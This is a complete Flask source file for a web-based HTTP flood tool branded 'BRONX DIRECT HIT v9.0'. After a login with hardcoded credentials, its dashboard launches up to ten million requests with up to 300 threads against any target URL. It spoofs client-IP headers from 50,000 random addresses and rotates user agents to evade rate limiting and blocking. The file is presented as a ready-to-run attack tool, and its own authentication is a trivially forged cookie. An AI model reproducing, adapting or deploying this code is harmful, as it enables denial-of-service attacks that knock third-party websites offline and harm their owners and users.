from flask import Flask, request, jsonify, render_template_string
import requests
import threading
import time
import random
from datetime import datetime
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
urllib3.disable_warnings()

app = Flask(__name__)

ADMIN_USER = "bronx"
ADMIN_PASS = "ultra2026"

active_attacks = {}
attack_stats = {"success": 0, "failed": 0, "total": 0}
attack_logs = []

# ============================================
# 🔥 ULTRA FAST - NO PROXY - DIRECT HIT
# ============================================
def generate_spoofed_ip():
    """Generate IPs from ALL ranges"""
    a = random.randint(1, 223)
    b = random.randint(0, 255)
    c = random.randint(0, 255)
    d = random.randint(1, 255)
    return f"{a}.{b}.{c}.{d}"

# 50000 spoofed IPs
SPOOFED_IPS = [generate_spoofed_ip() for _ in range(50000)]

# 50 User Agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
] * 5  # 50 total

# ============================================
# 💀 ULTRA DIRECT HIT WORKER
# ============================================
def ultra_hit(url):
    """ULTRA fast direct hit - NO proxy dependency"""
    try:
        spoofed_ip = random.choice(SPOOFED_IPS)
        ua = random.choice(USER_AGENTS)
        
        headers = {
            "User-Agent": ua,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
            "X-Forwarded-For": spoofed_ip,
            "X-Real-IP": spoofed_ip,
            "X-Client-IP": spoofed_ip,
            "CF-Connecting-IP": spoofed_ip,
            "True-Client-IP": spoofed_ip,
        }
        
        # DIRECT HIT - no proxy
        response = requests.get(url, headers=headers, timeout=10, verify=False, allow_redirects=True)
        
        # Check if success
        if response.status_code in [200, 201, 202, 204, 301, 302, 304, 307, 308]:
            return True
        elif response.status_code in [403, 429, 503]:
            return False
        else:
            return True  # Count as success for other codes
            
    except requests.exceptions.Timeout:
        return False
    except requests.exceptions.ConnectionError:
        return False
    except:
        return False

def attack_worker(attack_id, url, count):
    """Worker - direct hits"""
    success = 0
    fail = 0
    
    for i in range(count):
        if attack_id not in active_attacks:
            break
        
        if ultra_hit(url):
            success += 1
        else:
            fail += 1
        
        # Minimal delay
        if i % 10 == 0:
            time.sleep(0.001)
    
    return success, fail

def run_attack(attack_id, url, count, speed):
    """Run attack"""
    workers_map = {
        "slow": 10, "medium": 25, "fast": 50,
        "ultra": 100, "god": 200, "killer": 300
    }
    
    workers = workers_map.get(speed, 100)
    req_per_worker = max(1, count // workers)
    
    attack_logs.append(f"🔥 {count} req | {speed.upper()} | {workers} workers | DIRECT HIT")
    
    with ThreadPoolExecutor(max_workers=workers) as executor:
        futures = [executor.submit(attack_worker, attack_id, url, req_per_worker) for _ in range(workers)]
        
        total_s = 0
        total_f = 0
        
        for future in as_completed(futures):
            try:
                s, f = future.result(timeout=300)
                total_s += s
                total_f += f
            except:
                pass
    
    attack_stats["success"] += total_s
    attack_stats["failed"] += total_f
    attack_stats["total"] += total_s + total_f
    
    if attack_id in active_attacks:
        del active_attacks[attack_id]
    
    attack_logs.append(f"✅ DONE: {total_s} success | {total_f} failed | {(total_s/(total_s+total_f)*100) if (total_s+total_f)>0 else 0:.1f}%")

# ============================================
# 🎨 SIMPLE UI
# ============================================
LOGIN = """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>BRONX DIRECT HIT</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:system-ui,sans-serif}
.box{background:#0a0a0a;padding:35px;border-radius:16px;border:2px solid #ff0055;width:360px;text-align:center;box-shadow:0 0 50px rgba(255,0,85,0.2)}
h1{font-size:1.8em;color:#ff0055}
.tag{color:#555;font-size:0.65em;letter-spacing:3px;margin:8px 0}
input{width:100%;padding:12px;background:#111;border:1px solid #333;border-radius:8px;color:#fff;margin:7px 0;font-size:13px}
input:focus{border-color:#ff0055;outline:none}
.btn{width:100%;padding:12px;background:#ff0055;color:#fff;border:none;border-radius:8px;font-weight:700;cursor:pointer;font-size:14px;margin-top:8px;letter-spacing:1px}
.btn:hover{background:#ff2255}
</style></head><body>
<div class="box">
<h1>💀 BRONX HIT</h1>
<div class="tag">DIRECT • v9.0</div>
<p style="color:#555;font-size:0.55em">50000 IPs • 300 Workers • NO BLOCK</p>
<form method="post">
<input type="text" name="user" placeholder="Username">
<input type="password" name="pass" placeholder="Password">
<button class="btn" type="submit">ACCESS</button>
</form>
{% if error %}<p style="color:#f00;margin-top:8px;font-size:0.8em">{{ error }}</p>{% endif %}
</div>
</body></html>"""

DASH = """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>BRONX DIRECT HIT v9</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;color:#ddd;font-family:system-ui,sans-serif;padding:10px}
.container{max-width:1000px;margin:0 auto}
.header{display:flex;justify-content:space-between;align-items:center;padding:15px 20px;border:2px solid #ff0055;border-radius:12px;margin-bottom:15px;background:#0a0a0a}
.header h1{color:#ff0055;font-size:1.4em}
.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-bottom:15px}
.stat{background:#0a0a0a;border:1px solid #222;border-radius:10px;padding:18px;text-align:center}
.stat-val{font-size:2em;font-weight:bold}.s{color:#0f0}.f{color:#f00}.t{color:#ff0}
.stat-label{font-size:0.6em;color:#555;letter-spacing:2px;text-transform:uppercase}
.grid{display:grid;grid-template-columns:1fr 1fr;gap:12px}
.card{background:#0a0a0a;border:1px solid #222;border-radius:12px;padding:18px}
.card h3{color:#ff0055;margin-bottom:12px;font-size:0.85em}
input,select{width:100%;padding:10px;background:#111;border:1px solid #333;border-radius:8px;color:#fff;margin:5px 0;font-size:12px;font-family:monospace}
input:focus,select:focus{border-color:#ff0055;outline:none}
label{font-size:0.6em;color:#888;text-transform:uppercase;letter-spacing:1px;display:block;margin-top:6px}
.btn{width:100%;padding:10px;background:#ff0055;color:#fff;border:none;border-radius:8px;font-weight:700;cursor:pointer;margin:4px 0;font-size:0.75em;text-transform:uppercase;letter-spacing:1px}
.btn:hover{background:#ff2255}
.btn-stop{background:#333;color:#f00;border:1px solid #f00}
.row{display:grid;grid-template-columns:1fr 1fr;gap:6px}
.logs{background:#0a0a0a;border:1px solid #222;border-radius:8px;padding:10px;max-height:200px;overflow:auto;font-size:0.65em;font-family:monospace;color:#0f0}
.log-e{padding:2px 0;border-bottom:1px solid #111;color:#888}
.badge{display:inline-block;padding:4px 10px;border-radius:12px;font-size:0.6em;background:rgba(0,255,0,0.1);color:#0f0}
</style></head><body>
<div class="container">
<div class="header">
<div><h1>💀 BRONX DIRECT HIT v9.0</h1><div style="color:#888;font-size:0.55em">50000 IPs • 300 Workers • DIRECT • NO BLOCK</div></div>
<div style="display:flex;gap:8px;align-items:center">
<span class="badge">⚡ READY</span>
<a href="/logout" style="color:#f00;text-decoration:none;font-size:0.7em">EXIT</a>
</div>
</div>

<div class="stats">
<div class="stat"><div class="stat-val s" id="success">0</div><div class="stat-label">✅ Success</div></div>
<div class="stat"><div class="stat-val f" id="failed">0</div><div class="stat-label">❌ Failed</div></div>
<div class="stat"><div class="stat-val t" id="total">0</div><div class="stat-label">📊 Total</div></div>
</div>

<div class="grid">
<div class="card">
<h3>🎯 ATTACK</h3>
<label>Target URL</label><input type="text" id="url" placeholder="https://target.com">
<div class="row"><div><label>Requests</label><input type="number" id="count" value="100000"></div><div>
<label>Speed</label><select id="speed"><option value="slow">Slow (10)</option><option value="medium">Medium (25)</option><option value="fast">Fast (50)</option><option value="ultra" selected>Ultra (100)</option><option value="god">God (200)</option><option value="killer">Killer (300)</option></select>
</div></div>
<button class="btn" onclick="start()">🚀 LAUNCH</button>
<button class="btn btn-stop" onclick="stop()">⏹️ STOP</button>
<div id="status" style="margin-top:6px;text-align:center"></div>
</div>

<div class="card">
<h3>📊 LIVE STATS</h3>
<div style="display:grid;grid-template-columns:1fr 1fr;gap:6px">
<div class="stat"><div class="stat-val t" style="font-size:1.4em" id="successRate">0%</div><div class="stat-label">SUCCESS RATE</div></div>
<div class="stat"><div class="stat-val s" style="font-size:1.4em" id="rps">0</div><div class="stat-label">REQ/SEC</div></div>
</div>
</div>
</div>

<div class="card"><h3>📜 LOGS</h3><div class="logs" id="logs"><div class="log-e">⚡ 50000 Spoofed IPs Ready</div><div class="log-e">🔥 300 Workers Standby</div><div class="log-e">💀 DIRECT HIT MODE</div></div></div>
</div>

<script>
var lastTotal=0,lastTime=Date.now();
function u(){fetch('/stats').then(r=>r.json()).then(d=>{
document.getElementById('success').textContent=d.success;document.getElementById('failed').textContent=d.failed;
document.getElementById('total').textContent=d.total;
var t=d.success+d.failed;document.getElementById('successRate').textContent=t>0?((d.success/t)*100).toFixed(1)+'%':'0%';
var n=Date.now(),dt=n-lastTime;if(dt>0){document.getElementById('rps').textContent=Math.floor((d.total-lastTotal)/(dt/1000));lastTotal=d.total;lastTime=n;}
})}
function l(){fetch('/logs').then(r=>r.json()).then(d=>{document.getElementById('logs').innerHTML=d.logs.map(x=>'<div class="log-e">'+x+'</div>').join('')})}
function start(){
var url=document.getElementById('url').value,count=document.getElementById('count').value,speed=document.getElementById('speed').value;
if(!url){alert('Enter URL!');return}
fetch('/attack',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url,count:parseInt(count),speed})}).then(r=>r.json()).then(d=>{
document.getElementById('status').innerHTML='<span class="badge">⚡ ATTACKING</span>';l();u()})}
function stop(){fetch('/stop',{method:'POST'}).then(()=>{document.getElementById('status').innerHTML='<span style="color:#888">STOPPED</span>';l()})}
setInterval(function(){l();u()},1000)
</script></body></html>"""

# ============================================
# ROUTES
# ============================================
@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form.get('user')==ADMIN_USER and request.form.get('pass')==ADMIN_PASS:
            return '<script>document.cookie="auth=true;path=/";location.href="/dashboard"</script>'
        return render_template_string(LOGIN, error="ACCESS DENIED")
    return render_template_string(LOGIN, error=None)

@app.route('/dashboard')
def dashboard():
    if request.cookies.get('auth') != 'true':
        return '<script>location.href="/"</script>'
    return DASH

@app.route('/attack', methods=['POST'])
def attack():
    if request.cookies.get('auth') != 'true':
        return jsonify({"error":"Unauthorized"}), 403
    d = request.get_json()
    url = d.get('url', '')
    count = min(int(d.get('count', 1000)), 10000000)
    speed = d.get('speed', 'ultra')
    if not url: return jsonify({"error":"URL required"}), 400
    
    aid = f"atk_{int(time.time())}"
    active_attacks[aid] = True
    
    t = threading.Thread(target=run_attack, args=(aid, url, count, speed))
    t.daemon = True; t.start()
    return jsonify({"status":"started"})

@app.route('/stop', methods=['POST'])
def stop():
    for k in list(active_attacks.keys()): del active_attacks[k]
    return jsonify({"status":"stopped"})

@app.route('/logs')
def logs():
    return jsonify({"logs":[f"[{datetime.now().strftime('%H:%M:%S')}] {l}" for l in attack_logs[-50:]]})

@app.route('/stats')
def stats():
    return jsonify(attack_stats)

@app.route('/logout')
def logout():
    return '<script>document.cookie="auth=false;path=/";location.href="/"</script>'

if __name__ == "__main__":
    print("💀 BRONX DIRECT HIT v9.0")
    print(f"🔒 Spoofed IPs: {len(SPOOFED_IPS)}")
    import os
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, threaded=True)
